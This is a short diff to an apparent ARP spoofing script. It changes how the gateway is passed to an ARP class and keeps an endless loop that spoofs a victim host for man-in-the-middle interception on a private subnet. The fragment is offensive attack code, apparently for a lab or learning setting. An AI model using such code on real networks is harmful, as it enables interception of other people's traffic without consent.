@@ -19,7 +19,9 @@ def ARPSpoof(n_times = 0):
     attacker.get_mac()
     victim = User('192.168.56.101')
     victim.get_mac()
-    arp = ARP(attacker, victim, '192.168.56.102')
+    gateway = User('192.168.56.102')
+    gateway.get_mac()
+    arp = ARP(attacker, victim, gateway)
     if n_times <= 0:
         while True:
             arp.spoof(mitm=True)
